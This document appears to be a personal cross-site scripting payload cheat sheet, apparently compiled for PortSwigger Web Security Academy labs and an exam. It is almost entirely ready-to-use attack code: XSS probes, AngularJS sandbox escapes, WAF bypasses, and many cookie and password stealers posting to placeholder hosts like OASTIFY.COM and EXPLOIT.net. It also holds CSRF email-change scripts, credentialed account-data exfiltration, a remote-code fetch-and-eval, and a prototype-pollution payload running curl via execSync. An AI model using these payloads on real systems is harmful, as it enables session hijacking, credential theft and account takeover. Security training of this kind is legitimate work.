
### Detection
```
xX';!--"=&{()}Xx

DOM-XSS Fuzz: <>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer

\'-alert(1)//

'-alert(1)-'

';alert(document.domain)//

\';alert(document.domain)//

\"-alert(1)}//

'- alert(1) - '

\'- alert(1) -'

\'- alert(1) //

'+ alert(1) +'

\"-alert(1)}//

javascript:alert(0)

${alert(document.domain)}

onerror=alert;throw 1

&apos;-alert(document.domain)-&apos;

"-alert(window["document"]["cookie"])-"

"-window["alert"](window["document"]["cookie"])-"

?returnUrl=javascript:alert(document.domain)

<img src="https://EXPLOIT.net/img">

<><img src=1 onerror=alert(1)>

<><img src=1
onerror=javascript:fetch(`https://OASTIFY.COM?escape=`+document.cookie)>

<ScRiPt>alert(1)</sCrIpT>

<img src<img src=1 onerror=alert(1)>

<img src=0 onerror=alert`0`>

<img src=0 oNeRrOr=alert(0)>

<img src=x onerror="&#x61;lert(1)">

<img src=x onerror="#00000000000058;alert(1)">

<img src=x onerror=prompt(1)>

</script><img src=1 onerror=alert(document.domain)>

<img src=0 onerror=this.src='https://<IP>/?cookie='+btoa(document.cookie)>

</ScRiPt ><img src=a onerror=document.location="[https://OASTIFY.COM/?biscuit="+document.cookie](https://oastify.com/?biscuit=%22+document.cookie)>  

<script>new Image().src="http://Collaborator.COM/cool.jpg?output="+document.cookie;</script>

<img src=0 onerror="new Image().src='https://collaborator/?cookie='+btoa(document.cookie)">

<img src=0 onerror="fetch('https://<IP>/?cookie='+btoa(document.cookie))">

<a href="javascript:alert(document.domain)">

<script src="https://EXPLOIT.net/script"></script>

<video src="https://EXPLOIT.net/video"></video>

'">

<svg/onload=fetch(//OASTIFY.COM/${encodeURIComponent(document.cookie)})>:CURRENT-USER-LOGIN-COOKIE-2ND-PART

<svg><animateTransform onbegin=alert(1)>

<ScRiPt>alert(1)</sCrIpT>

<scr<script>ipt>alert(1)</scr</script>ipt>

<script>eval(atob('YWxlcnQoMSk='));</script>  // POC alert(1)

</script><script>alert(1)</script>

>alert(document.domain)</script>

fetch(https://OASTIFY.COM/?jsonc= + window["document"]["cookie"]) <-BASE64
"-eval(atob("BASE64"))-"  <-URLENCODE

\';document.location=https://OASTIFY.COM/?BackTicks=+document.cookie;//
```


### AngularJS DOM XSS Attack constructor payloads
```
{{1+1}}

{{$on.constructor('alert(1)')()}}

{{$on.constructor('document.location="https://COLLABORATOR.com?c="+document.cookie')()}}

{{constructor.constructor('alert(1)')()}}

{{$on.constructor('alert(1)')()}}

{{$eval.constructor('alert(1)')()}}

{{[].pop.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}

{{constructor.constructor('fetch(`https://<BURP-COLLAB>/?cookie=`+btoa(document.cookie));')()}}

{{$eval.constructor('document.location="https://<COLLABORATOR||EXPLOIT-SV>?cookie="+document.cookie')()}}

{{constructor.constructor('document.location="https://<COLLABORATOR||EXPLOIT-SV>?cookie="+document.cookie')()}}
```
### Exploit
```
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">

<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>

<script>
location = 'https://kek.web-security-academy.net/?query=%3Cbody+onload%3Ddocument.location%3D%27https%3A%2F%2Fburp.oastify.com%2F%3Fc%3D%27%2Bdocument.cookie%20tabindex=1%3E#x';
</script>

<script>
document.write('<img src="HTTPS://EXPLOIT.net/?c='+document.cookie+'" />');
</script>

<script>document.write('<img src="https://EXPLOIT.net/?c='%2bdocument.cookie%2b'" />');</script>

<script>fetch(`https://<BURP-COLLAB>/?cookie=`+btoa(document.cookie));</script>

<script>fetch(https://<BURP-COLLAB>/${btoa(document.cookie)}</script>

Steal cookies collaborator:
<script>
fetch(`https://burpcollaborator.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});
</script>

Steal Cookies Exploit Server:
<script>
fetch(`https://collaborator.net/x`+document.cookie);
</script>

XSS Cookie Stealer payloads using JavaScript  
JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie

Reflected XSS into HTML context with nothing encoded in search.
<script>document.location='https://COLLABORATOR.com?c='+document.cookie</script>

Reflected DOM XSS, into JSON data that is processed by eval().
\"-fetch('https://Collaborator.com?cs='+btoa(document.cookie))}//

JavaScript Template literals are enclosed by backtick ( ` ) characters instead of double or single quotes.  

${document.location='https://tvsw9dim0doynnpscx9mgtq67xdo1jp8.oastify.com/?cookies='+document.cookie;}

" autofocus onfocus=alert(document.domain) x="
<custom-tag onfocus="alert(1)" id="x" tabindex="1"> -> in the end of url add #x to reference the custom tag

<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>

<script>
location = 'https://TARGET.net/?search=<xss+id=x+onfocus=document.location='https://OASTIFY.COM/?c='+document.cookie tabindex=1>#x';
</script>

<script>  
location = "https://TARGET.net/?search=%3C%2FScRiPt+%3E%3Cimg+src%3Da+onerror%3Ddocument.location%3D%22https%3A%2F%2FOASTIFY.COM%2F%3Fbiscuit%3D%22%2Bdocument.cookie%3E"
</script>

</ScRiPt ><ScRiPt >document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />');</ScRiPt > 

"-alert(window["document"]["cookie"])-"

"-window["alert"](window["document"]["cookie"])-"

"-self["alert"](self["document"]["cookie"])-"

"+eval(atob("ZmV0Y2goImh0dHBzOi8vYnVycC5vYXN0aWZ5LmNvbS8/Yz0iK2J0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//

<svg><animateTransform onbegin=fetch(`https://<BURP-COLLAB>/?cookie=`+btoa(document.cookie));>

<svg><a><animate attributeName= href values=javascript:alert(0) /><text x=30 y=30>Click me!</a>

// canonical link + access key -> test with alt+shift+x || ctrl+alt+x || alt+x ..etc
https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)

"><script="1" onerror="window.location='https://exploit.net/cookie='+document.cookie"><script>

document.write('<img src="https://exploit.net?cookieStealer='+document.cookie+'" />');
</script>

Replace your input with the following payload to escape the quoted attribute and inject an event handler: "onmouseover="alert(1)
```


### Forms
```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{`
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">

<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();`
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>

<script>
fetch('https://COLLABORATOR.com', {
method: 'POST',
mode: 'no-cors',
body:'biscuit='+document.cookie
}); 
</script>   

:::: Steal Password / Cookie Stealer ::::
XMLHttpRequest
<input name=username id=username>
<input type=password name=password id=password onchange="CaptureFunction()">
<script>
function CaptureFunction()
{
var user = document.getElementById('username').value;
var pass = document.getElementById('password').value;
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://exploit.com/?username=" + user + "&password=" + pass, true);
xhr.send();
}
</script>

FETCH API
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">


<script>
    document.location=""http://stock.lab.web-security-academy.net/?productId=4
            <script>
                    var req = new XMLHttpRequest(); 
                    req.onload = reqListener; 
                    req.open('get','https://lab.web-security-academy.net/accountDetails',true); 
                    req.withCredentials = true;
                    req.send();
                    function reqListener() {
                            location='https://exploit.web-security-academy.net/log?key='%2bthis.responseText;
                    };
            %3c/script>
            &storeId=1""
</script>

<script>
fetch(‘https://burpcollaborator.net’, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});
</script>

<body>    
<script>
// Define the URLs for the lab environment and the exploit server.
const academyFrontend = "https://your-lab-url.net/";
const exploitServer = "https://your-exploit-server.net/exploit";
// Extract the CSRF token from the URL.
const url = new URL(location);
const csrf = url.searchParams.get('csrf');
// Check if a CSRF token was found in the URL.
if (csrf) {
    // If a CSRF token is present, create dynamic form elements to perform the attack.
    const form = document.createElement('form');
    const email = document.createElement('input');
    const token = document.createElement('input');
    // Set the name and value of the CSRF token input to utilize the extracted token for bypassing security measures.
    token.name = 'csrf';
    token.value = csrf;
    // Configure the new email address intended to replace the user's current email.
    email.name = 'email';
    email.value = 'hacker@evil-user.net';
    // Set the form attributes, append the form to the document, and configure it to automatically submit.
    form.method = 'post';
    form.action = `${academyFrontend}my-account/change-email`;
    form.append(email);
    form.append(token);
    document.documentElement.append(form);
    form.submit();
    // If no CSRF token is present, redirect the browser to a crafted URL that embeds a clickable button designed to expose or generate a CSRF token by making the user trigger a GET request
} else {
    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
}
</script>
</body>
```


HTTP request smuggling to deliver reflected XSS
```
a"/><script>document.location='https://bc.oastify.com/cookiestealer.php?c='+document.cookie;</script>
```

Web Cache Parameter cloaking - script /js/geolocate.js, executing the callback function setCountryCookie()
```
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=document.location='http://BURPCOL.oastify.com/?StealCookies=' document.cookie ;//
```

More Cross-Site Scripting (XSS) example cookie stealer payloads.
```
<script>
document.location='https://Collaborator.com/?cookiestealer='+document.cookie;
</script>
```


HTML  Tag, with invalid Image source, with escape sequence from source code calling window.location for the **LastViewedProduct``` cookie.
```
&'><img src=1 onerror=print()>
&'><img src=x onerror=this.src="https://exploit-0a6b000b033762e6c0fa121d01fc0020.exploit-server.net/?ex="+document.cookie>
<img src=x onerror=this.src=https://exploit.net/?'+document.cookie;>
```

Document.location returns a Location object, which contains information about the URL of the document and provides methods for changing that URL and loading another URL.  
```
document.location='https://burp-collab.x.com/cookiestealer.php?c='+document.cookie;
document.location='https://BurpCollaBoRaTor.oastify.com/?FreeCookies='+document.cookie;
```

Document.write
```
/?evil='/><script>document.write('<img src="https://exploit.com/steal.MY?cookie=' document.cookie '" />')</script> 

x"); var fuzzer=new Image;fuzzer.src="https://COLLABORATOR.com/?"+document.cookie; //

<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>  
```
### Bypass WAF
```
// -> escape ' with \
\'<script>alert(1)</script>

// -> escape \ with other \ and escape ' with \
\\'<script>alert(1)</script>

// -> escape ' with \ + comment the rest of the js code with //
\' - alert(1) // 

// in JS template ` 
${alert(0)}
// ->  in html context, close <script> tag an inject another
x</script><script>alert(1)</script>
// the server escape our ' -> escape \ with other \  -> add xss -> comment the rest of the js code
\'-alert(1)//

// the server escape our ' and \ -> ' in html entity -> &apos; 
http://foo?&apos;-alert(1)-&apos;

// replace(<>)
<><img src=1 onerror=alert(1)>  

If eval() being blocked then Alternatives:
- setTimeout("code")
- setInterval("code)
- setImmediate("code")
- Function("code")()
  
If brackets ( ) are blocked = use 
"}; location="https://BURP-COLLABORATOR-URL/?"+document.cookie; //
%22};%20location=%22https://BURP-COLLABORATOR-URL/?%22%2bdocument.cookie;%20//

If full stop . is blocked = use
"};location=atob("**base64('https://BURP-COLLAB-URL/?')**")+document["cookie"]; //
```

### Alt Cookie Stealer 
```
?productId=1&storeId="></select><img src=x onerror=this.src='http://exploit.bad/?'+document.cookie;>

<script>
document.write('<img src="http://exploit.net?cookieStealer='+document.cookie+'" />');
</script>


:::: DATA EXFILTRATION / COOKIE STEALER ::::
</textarea><script>fetch('http://exploit.evil?cookie=' + btoa(document.cookie) );</script> 

<script>document.write('<img src="http://evil.net/submitcookie.php?cookie=' + escape(document.cookie) + '" />');</script>

DOM XSS JSON.parse web messages

Requirements to steal cookie using this method: same-origin execution and non-HttpOnly cookie

Rabbit hole: The CORS policy No Access-Control-Allow-Origin header block access for Collaborator from able to access to fetch and cookie need insecure flags

<iframe src=https://TARGET.net/ onload='this.contentWindow.postMessage(JSON.stringify({
    "type": "load-channel",
    "url": "JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie"
}), "*");'>

Javascript set test cookie in current browser session with no HttpOnly flag to allow proof of concept cookie stealer.
  

document.cookie = "TopSecretCookie=HackThePlanetWithPeanutButter";

Remote code execution via server-side prototype pollution

  "__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}

// JQuery $ + onhashchange #
<iframe src="<IP>/#" onload="this.src+='<img src=0 onerror=alert(0)>'</iframe>

COOKIE-STEALER

<iframe src="<IP>/#" onload="this.src +='<img src=1 onerror=document.cookie()>'" hidden="hidden"></iframe>

<iframe src="<IP>/?cookie='+btoa(document.cookie))" onload=<img src=1 onerror=alert(1)> hidden="hidden"</iframe>

\';fetch(`https://<BURP-COLLAB>/?cookie=`+btoa(document.cookie))//

JavaScript:document.location='https://<BURP-COLLAB>?cookie='+document.cookie

${document.location='https://<BURP-COLLAB>/?cookies'+document.cookie;}

<script>fetch(`https://<BURP-COLLAB>.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});</script>
<script>fetch(`https://<EXPLOIT-SV>.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});</script>

// tags / atributtes blacklisted
<iframe
  src="https://<IP>>/?search="><body onresize=fetch('https://<EXPLOIT-SV>/exploit/?cookie='+btoa(document.cookie))>"
  onload="this.style.width='100px' ">
</iframe>

// json format in response injected in eval() without JSON.parse == string
// eval() function it's a dangerous function that takes a string and execute it as javascript code
// the server scape " with \ so scape with another \ close } and comment with comment with javascript comment (//)
// adapt the payload in the exam depending of the parser
\"-fetch('https://<COLLABORATOR>?cookie='+btoa(document.cookie))}//

// in comments
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>

javascript:eval(atob("")) <-- inyect in B64 the payload from below

fetch('https://<IP>/?c='+document.cookie).then(r=>r.text()).then(eval)

echo -n "alert(1)" | python3 -c "import sys; print(','.join(str(ord(c)) for c in sys.stdin.read()))"

output: 97,108,101,114,116,40,49,41

<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>


DATA-STEALER
// steal creds + cors bypass 
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://<IP>',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">

 // steal csrf token + cors bypass and csrf
 <script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>

ONE-LINERS

// change accountDetails for the param required  
<script>var req = new XMLHttpRequest();req.onload = reqListener;req.open('GET','https://<IP>/accountDetails',true);req.withCredentials = true;req.send();function reqListener() {location='https://<EXPLOIT-SV>/?data='+encodeURIComponent(btoa(this.responseText));};</script>

// --------------------- //

<script>new XMLHttpRequest().withCredentials=true;void(req.onload=()=>location='https://<EXPLOIT-SV>/?d='+btoa(req.responseText));req.open('GET','https://<IP>/accountDetails');req.send()</script>

// -------------------- //


fetch('https://<IP>/accountDetails',{credentials:'include'}).then(r=>r.text()).then(d=>location='https://<EXPLOIT-SV>/?d='+btoa(d))


<script>
    document.location="http://<subdomain.<IP>/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('GET','https://<IP>.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://<EXPLOIT-SERVER>/log?key='%2b btoa(this.responseText) };%3c/script>&storeId=1"
</script>


READ /home/carlos/secret

// XSS -> <script src="http://<IP>/exploit"></script>

var domain ="http://<IP>/home/carlos/secret"
var ourDomain = "http://<OUR-SERVER>/exploit"

var req = new XMLHttpRequest();
req.withCredentials = true;
req.open('GET', domain, false);
req.send();

var response = req.responseText;
req2.open('GET', ,ourDomain +"/steal?data= + btoa(response) , false);
req2.withCredentials = true;
req2.send(response);



DOM-POST-MESSAGES

// basic post message
window.postMessage('<img src=0 onerror=alert(1)>');

// post message in url
<iframe width=100% height=100% src="<ip>" 
onload='this.contentWindow.postMessage("javascript:alert(0)//https://google.com","*")'></iframe>


<iframe src="<IP>" onload="this.contentWindow.postMessage('<img src=0 onerror=alert(1)>', '*')"></iframe>
<iframe src="https://<IP>/" onload="this.contentWindow.postMessage('<img src=0 onerror=fetch(`https://EXPLOIT-SV>/?cookie=`+btoa(document.cookie))>', '*')"></iframe>

<iframe src="<IP>>/" 
        onload="this.contentWindow.postMessage('<img src=x onerror=&quot;fetch(\'https://<BURP-COLLAB>/?cookie=\' + btoa(document.cookie))&quot;>', '*')">
</iframe>


SINKS-AND-SOURCES

- SOURCES: origins of untrusted data (inputs coming from external sources).
- SINKS: points where that data can execute
- E.G -> sources -> x = window.location.search() + sink -> document.write(x)


```